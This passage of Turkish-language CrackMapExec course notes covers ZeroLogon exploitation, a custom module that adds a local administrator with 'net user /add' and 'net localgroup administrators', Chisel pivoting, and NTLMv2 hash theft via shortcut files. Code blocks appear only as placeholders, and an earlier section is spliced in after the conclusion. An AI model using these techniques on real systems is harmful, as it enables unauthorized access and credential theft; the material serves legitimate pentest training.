Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'print

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

